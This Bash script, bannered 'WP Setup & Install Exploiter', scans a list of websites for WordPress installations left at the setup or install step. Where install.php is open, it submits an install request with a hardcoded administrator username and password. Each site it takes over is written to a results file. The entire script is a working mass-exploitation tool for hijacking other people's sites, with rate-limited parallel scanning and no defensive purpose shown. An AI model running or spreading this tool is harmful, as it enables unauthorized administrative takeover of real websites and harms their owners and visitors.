#!/bin/bash
cyan='\033[0;36m'
green='\e[92m'
red='\033[0;31m'
ijo="\e[92m"
putih="\e[97m"

banner(){
clear
printf "${ijo}
  ${putih}[${ijo}+${putih}] WP Setup & Install Exploiter ${putih}[${ijo}+${putih}] ${ijo}
 ██╗███╗   ██╗███████╗████████╗ █████╗ ██╗     ██╗     
 ██║████╗  ██║██╔════╝╚══██╔══╝██╔══██╗██║     ██║     
 ██║██╔██╗ ██║███████╗   ██║   ███████║██║     ██║     
║██║██║╚██╗██║╚════██║   ██║   ██╔══██║██║     ██║     
╔██║██║ ╚████║███████║   ██║   ██║  ██║███████╗███████╗
╚═╝  ╚═══╝ ╚═════╝ ╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  
                                    ${putih}LeviathanPerfectHunter
"
}
skuy(){
  Array=('/' '/new' '/blog' '/blogs' '/demo' '/wp' '/wordpress' '/tes' '/test' '/web')
  for path in "${Array[@]}"; do
    skuy=$(curl -s -k --compressed --connect-timeout 5 "$site/$path/wp-admin/setup-config.php?step=0" -L)
    if [[ $skuy =~ 'setup-config.php?step=1' ]]; then
      printf "$green[+] Found Setup $site/wp-admin/setup-config.php [WP Setup & Install Exploiter - LeviathanPerfectHunter]\n"
      echo "$site/wp-admin/setup-config.php" >> wp-setup.txt
    fi
    if [[ $(curl -s -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36" $site/wp-admin/install.php | grep -o 'English (United States)') =~ 'English (United States)' ]]; 
    then
      echo "[+] Maybe Vuln"
      exploit=$(curl --silent -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36" -d "weblog_title=Killer&user_name=Leviathan&admin_password=Leviathan1337&admin_password2=Leviathan1337&admin_email=$email" $site/wp-admin/install.php?step=2 | grep -o '<h1>Success!</h1>')
      if [[ $exploit =~ '<h1>Success!</h1>' ]];
      then
      printf "$green[+] Sukses Install!\n"
      echo "$site/wp-login.php" | tee -a result_wp.txt
      echo "Username = leviathan" | tee -a result_wp.txt
      echo "Password = Leviathan1337" | tee -a result_wp.txt
      else
      printf "$red[-] Failed\n"
      fi
     else
    printf "$ijo$site$path$red Not Vulnerable $ijo[WP Setup & Install Exploiter - LeviathanPerfectHunter]\n"
   fi
 done
}
banner
read -p "Your List : " list
read -p "Your Email : " email
read -p "Send Per List(10|20|30): " sending
read -p "Delay(3|5|10): " waktudelay

persend="$sending"
delay="$waktudelay"
hitung=0

IFS=$'\r\n' GLOBIGNORE='*' command eval 'list=($(cat $list))'
for (( i = 0; i <"${#list[@]}"; i++ )); do

  site="${list[$i]}"

  ngesend=$(expr $hitung % $persend)
  if [[ $ngesend == 0 && $hitung > 0 ]]; then
    sleep $delay
  fi

  skuy &
    hitung=$[$hitung+1]
done
wait
